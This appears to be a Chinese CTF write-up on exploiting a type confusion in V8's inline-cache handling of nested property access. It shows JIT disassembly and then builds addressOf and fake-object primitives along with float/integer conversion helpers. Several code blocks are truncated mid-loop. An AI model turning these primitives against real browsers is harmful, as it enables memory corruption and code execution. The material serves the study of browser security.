    function  opt(o){
        return o.a.b;
    }
    for(var i = 0; i 
    0x3b6d7cc2e08   1a8  48b8000000000e000000 REX.W movq rax,0xe00000000
    0x3b6d7cc2e12   1b2  4c8bc6         REX.W movq r8,rsi
    0x3b6d7cc2e15   1b5  49baa0792d89ab7f0000 REX.W movq r10,0x7fab892d79a0  (LoadGlobalICTrampoline)    ;; off heap target
    0x3b6d7cc2e1f   1bf  41ffd2         call r10
其中opt函数优化为如下，可以看到其被优化为了数组寻址的方法
    0x3e95ea042b5b    3b  55             push rbp
    0x3e95ea042b5c    3c  4889e5         REX.W movq rbp,rsp
    0x3e95ea042b5f    3f  56             push rsi
    0x3e95ea042b60    40  57             push rdi
    0x3e95ea042b61    41  4883ec08       REX.W subq rsp,0x8
    0x3e95ea042b65    45  488975e8       REX.W movq [rbp-0x18],rsi
    0x3e95ea042b69    49  493b65e0       REX.W cmpq rsp,[r13-0x20] (external value (StackGuard::address_of_jslimit()))
    0x3e95ea042b6d    4d  0f8630000000   jna 0x3e95ea042ba3  
    0x3e95ea042b73    53  488b5510       REX.W movq rdx,[rbp+0x10]
    0x3e95ea042b77    57  f6c201         testb rdx,0x1
    0x3e95ea042b7a    5a  0f8449000000   jz 0x3e95ea042bc9  
    0x3e95ea042b80    60  48b9b9a6cc430b0e0000 REX.W movq rcx,0xe0b43cca6b9    ;; object: 0x0e0b43cca6b9 
    0x3e95ea042b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx
    0x3e95ea042b8e    6e  0f8541000000   jnz 0x3e95ea042bd5  
    0x3e95ea042b94    74  488b5217       REX.W movq rdx,[rdx+0x17]
    0x3e95ea042b98    78  488b4217       REX.W movq rax,[rdx+0x17]
    0x3e95ea042b9c    7c  488be5         REX.W movq rsp,rbp
    0x3e95ea042b9f    7f  5d             pop rbp
考虑到是`ICS`缓存机制的原因，`o.a.b`的类型被缓存，因此存入`1.1`时仍然是以`HOLEY_ELEMENTS`的方式将`1.1`打包为`HeapNumber`，存为了对象，那么我们尝试这样修改
    var obj = {a:{b:"haivk"}};
    function  opt(o){
        return o.a.b;
    }
    for(var i = 0; i 
    0x1c8800bc2b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx
    0x1c8800bc2b8e    6e  0f8541000000   jnz 0x1c8800bc2bd5  
    0x1c8800bc2b94    74  488b5217       REX.W movq rdx,[rdx+0x17]
    0x1c8800bc2b98    78  488b4217       REX.W movq rax,[rdx+0x17]
    0x1c8800bc2b9c    7c  488be5         REX.W movq rsp,rbp
    0x1c8800bc2b9f    7f  5d             pop rbp
继续运行，发现发生了类型混淆，1.1被当成一个对象地址，然后取出了一个对象
由此，我们可以构造如下两个原语
    function addressOf(obj) {
       var obj1 = {a:{b:1.1}};
       let f = eval(`(obj1)=>{
          return obj1.a.b;
       }`);
       for (var i=0;i{
          return obj2.x.y;
       }`);
       for (var i=0;i
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    function addressOf(obj) {
       var obj1 = {a:{b:1.1}};
       let f = eval(`(obj1)=>{
          return obj1.a.b;
       }`);
       for (var i=0;i{
          return obj1.e.f;
       }`);
       for (var i=0;i{
          return obj2.x.y;
       }`);
       for (var i=0;i
## 0x04 感想
通过本题加深了对v8的字典对象的理解，同时学习了`wasm`在浏览器漏洞中的利用手法。浏览器PWN虽然难但是很有趣。
## 0x05 参考
[Shapes and Inline Caches](https://mathiasbynens.be/notes/shapes-ics)  
[[译] JavaScript 引擎基础：Shapes 和 Inline
Caches](https://hijiangtao.github.io/2018/06/17/Shapes-ICs/)  
[JavaScript engine fundamentals: optimizing
prototypes](https://mathiasbynens.be/notes/prototypes)  
[简明扼要地谈谈v8的隐藏类和Inline
Cache（内联缓存](https://blog.csdn.net/cteng/article/details/77151281)